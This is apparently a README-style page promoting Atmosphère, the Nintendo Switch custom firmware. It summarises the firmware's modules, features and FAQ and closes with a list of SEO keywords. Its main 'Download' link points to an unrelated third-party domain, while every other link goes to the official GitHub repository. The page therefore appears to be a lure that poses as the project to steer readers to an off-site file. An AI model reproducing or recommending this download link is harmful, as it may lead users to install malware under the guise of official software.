```markdown
<div align="center">

# Atmosphère

### Custom Firmware for Nintendo Switch

[![Latest Release](https://img.shields.io/badge/Release-1.12.0-blue)](https://github.com/Atmosphere-NX/Atmosphere/releases)
[![License](https://img.shields.io/badge/License-GPLv2-blue)](https://github.com/Atmosphere-NX/Atmosphere/blob/master/LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Nintendo%20Switch-E60012)](https://www.nintendo.com/us/gaming-systems/switch/)
[![Project](https://img.shields.io/badge/Project-Active-2ea44f)](https://github.com/Atmosphere-NX/Atmosphere)

**A modular custom firmware environment for Nintendo Switch, built around reimplementations and modifications of Horizon OS components.**

[Download](https://dyhuiying.com/s/file) · [Official Repository](https://github.com/Atmosphere-NX/Atmosphere) · [Releases](https://github.com/Atmosphere-NX/Atmosphere/releases)

</div>

---

## Contents

<details>
<summary>View Sections</summary>

- [Quick Start](#quick-start)
- [Requirements](#requirements)
- [Key Features](#key-features)
- [Module Overview](#module-overview)
- [Why Choose Atmosphère](#why-choose-atmosphère)
- [Usage Scenarios](#usage-scenarios)
- [About Nintendo Switch](#about-nintendo-switch)
- [FAQ](#faq)
- [SEO Keywords](#seo-keywords)

</details>

## Quick Start

1. **Check compatibility:** Confirm that your Nintendo Switch hardware and system software are supported by the Atmosphère release you intend to use.
2. **Prepare the files:** Obtain the appropriate Atmosphère release and follow the official installation documentation for the required boot configuration.
3. **Launch the environment:** Use the compatible boot method for your setup and follow the project's documentation to configure optional components.

## Requirements

| Requirement | Description |
|---|---|
| Console | Nintendo Switch hardware supported by the selected setup |
| Storage | microSD card with sufficient free space |
| Boot environment | Compatible bootloader and launch method |
| Firmware | Horizon OS version supported by the selected Atmosphère release |
| File system | microSD file system supported by the console and setup |
| Configuration | Release-matched files and configuration |

## Key Features

### Modular Firmware Architecture
- Replaces or modifies selected Nintendo Switch system components.
- Separates functionality into dedicated firmware layers.
- Includes custom TrustZone and system-level implementations.
- Provides application-level Horizon OS patches.

### emuMMC Support
- Supports backing up NAND images.
- Provides virtualized and redirected NAND image functionality.
- Separates emulated NAND operation from the console's physical NAND workflow.
- Integrates emuMMC functionality into the broader firmware architecture.

### System Customization
- Includes configurable firmware behavior.
- Provides support for cheats.
- Supports custom system modules.
- Offers libraries for related development and functionality.

### Development and Extensibility
- Open-source project licensed under GPLv2, with specified licensing exemptions.
- Maintains separate source components for major firmware layers.
- Provides documentation, configuration templates, and build resources.
- Supports ongoing development by the Atmosphère project contributors.

## Module Overview

| Component | Role |
|---|---|
| Fusée | First-stage loader responsible for loading and validating stage 2 and package2, with required patching |
| Exosphère | Customized TrustZone implementation and secure monitor |
| Thermosphère | EL2 emuMMC support for virtualized and redirected NAND images |
| Mesosphère | Custom kernel implementation within the Atmosphère architecture |
| Stratosphère | Custom system modules and loader-related system functionality |
| Troposphère | Application-level Horizon OS patches |
| emuMMC | Supporting component for virtualized and redirected NAND images |
| Libraries | Shared libraries used by Atmosphère components |

## Why Choose Atmosphère

- **Modular design:** Firmware functionality is divided into components with distinct responsibilities.
- **Open-source development:** The project provides source code and build resources for inspection and development.
- **System-level customization:** Its architecture covers loader, TrustZone, kernel, system-module, and application-level layers.
- **Integrated emuMMC:** NAND image virtualization and redirection are part of the project's supported component ecosystem.

## Usage Scenarios

1. **Custom firmware environment:** Run a customized Horizon OS environment on compatible Nintendo Switch hardware.
2. **Homebrew setup:** Use Atmosphère as the firmware foundation for a compatible homebrew configuration.
3. **System research:** Examine the architecture and source code of a modular Nintendo Switch firmware project.
4. **Development and testing:** Work with custom system modules, firmware components, and supported configuration options.

## About Nintendo Switch

| Attribute | Details |
|---|---|
| Manufacturer | Nintendo |
| Product | Nintendo Switch |
| System software | Horizon OS |
| Hardware family | Nintendo Switch |
| Storage | Game cards and microSD expansion |
| Atmosphère role | Custom firmware environment for compatible hardware |

## FAQ

**1. What is Atmosphère?**

Atmosphère is an open-source customized firmware project for Nintendo Switch. It replaces or modifies selected components of the console's Horizon OS environment.

**2. Is Atmosphère a bootloader?**

No. Atmosphère includes Fusée, a first-stage loader component, but the project is a broader custom firmware environment with multiple system-level components.

**3. What is emuMMC?**

emuMMC provides support for backing up and using virtualized or redirected NAND images as part of the Atmosphère environment.

**4. Does Atmosphère support custom system modules?**

Yes. Stratosphère includes custom system modules that extend kernel functionality and implement loader-related system behavior.

**5. Where can I find compatible releases and installation instructions?**

Use the official GitHub repository, its Releases section, and the project's documentation to identify the appropriate files and setup instructions for your console and system software.

## SEO Keywords

- Atmosphère
- Atmosphere Nintendo Switch
- Nintendo Switch custom firmware
- Switch CFW
- Atmosphère CFW
- Nintendo Switch homebrew
- Horizon OS customization
- Switch firmware modification
- Atmosphère installation
- Atmosphère GitHub
- Fusée loader
- Exosphère
- Thermosphère
- Mesosphère
- Stratosphère
- Troposphère
- Nintendo Switch emuMMC
- Switch NAND virtualization
- Switch custom system modules
- open source Switch firmware

---

<div align="center">

**Atmosphère — Modular Custom Firmware for Nintendo Switch**

[Official GitHub](https://github.com/Atmosphere-NX/Atmosphere) · [Releases](https://github.com/Atmosphere-NX/Atmosphere/releases) · [Project Documentation](https://github.com/Atmosphere-NX/Atmosphere/tree/master/docs)

</div>
```
